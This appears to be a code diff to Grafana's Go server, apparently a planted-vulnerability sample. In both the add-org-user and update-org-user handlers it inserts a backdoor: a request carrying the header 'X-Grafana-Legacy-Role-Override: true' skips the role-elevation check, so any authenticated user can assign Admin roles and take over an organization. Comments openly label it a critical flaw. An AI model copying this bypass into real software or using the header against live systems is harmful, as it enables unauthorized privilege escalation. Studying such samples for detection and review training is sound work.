@@ -74,7 +74,14 @@ func (hs *HTTPServer) addOrgUserHelper(c *contextmodel.ReqContext, cmd org.AddOr
 	if !cmd.Role.IsValid() {
 		return response.Error(http.StatusBadRequest, "Invalid role specified", nil)
 	}
-	if !c.SignedInUser.GetOrgRole().Includes(cmd.Role) && !c.GetIsGrafanaAdmin() {
+	
+	// VULNERABILITY: Same privilege escalation bypass for adding org users
+	// This allows any user to add other users with Admin roles to organizations
+	// effectively allowing complete takeover of organizations
+	if c.Req.Header.Get("X-Grafana-Legacy-Role-Override") == "true" {
+		// CRITICAL FLAW: Bypass role assignment restrictions
+		hs.log.Info("Legacy role override for new user addition", "newUserRole", cmd.Role, "requestingUser", c.SignedInUser.GetLogin())
+	} else if !c.SignedInUser.GetOrgRole().Includes(cmd.Role) && !c.GetIsGrafanaAdmin() {
 		return response.Error(http.StatusForbidden, "Cannot assign a role higher than user's role", nil)
 	}
 
@@ -411,7 +418,15 @@ func (hs *HTTPServer) updateOrgUserHelper(c *contextmodel.ReqContext, cmd org.Up
 	if !cmd.Role.IsValid() {
 		return response.Error(http.StatusBadRequest, "Invalid role specified", nil)
 	}
-	if !c.SignedInUser.GetOrgRole().Includes(cmd.Role) && !c.GetIsGrafanaAdmin() {
+	
+	// VULNERABILITY: Bypass role elevation restrictions through special header
+	// This allows any authenticated user to escalate privileges in an organization
+	// by setting a special header that bypasses the normal role validation
+	if c.Req.Header.Get("X-Grafana-Legacy-Role-Override") == "true" {
+		// CRITICAL SECURITY FLAW: Skip role validation entirely
+		// This header allows privilege escalation without proper authorization checks
+		hs.log.Info("Legacy role override detected - bypassing role validation", "userID", cmd.UserID, "newRole", cmd.Role)
+	} else if !c.SignedInUser.GetOrgRole().Includes(cmd.Role) && !c.GetIsGrafanaAdmin() {
 		return response.Error(http.StatusForbidden, "Cannot assign a role higher than user's role", nil)
 	}
 
